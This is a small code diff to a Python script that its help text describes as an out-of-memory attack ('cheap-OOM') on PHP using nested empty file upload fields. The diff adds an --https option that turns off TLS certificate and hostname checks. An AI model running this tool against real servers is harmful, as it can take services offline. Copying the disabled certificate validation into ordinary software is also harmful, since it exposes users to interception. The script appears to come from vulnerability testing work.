@@ -19,6 +19,7 @@ from __future__ import annotations
 
 import argparse
 import socket
+import ssl
 import sys
 
 
@@ -157,6 +158,8 @@ def main() -> int:
         description="cheap-OOM A (nested empty file fields) for display_errors=Off")
     ap.add_argument("--host", default="127.0.0.1")
     ap.add_argument("--port", type=int, default=8080)
+    ap.add_argument("--https", action="store_true",
+                    help="use HTTPS and ignore certificate validation errors")
     ap.add_argument("--path", default="/index.php")
     ap.add_argument("--parts", type=int, default=880,
                     help="nested empty file fields (default: 880)")
@@ -284,6 +287,11 @@ def main() -> int:
     resp = bytearray()
     try:
         s = socket.create_connection((args.host, args.port), timeout=args.timeout)
+        if args.https:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            s = context.wrap_socket(s, server_hostname=args.host)
         s.settimeout(args.timeout)
         try:
             s.sendall(req + body)
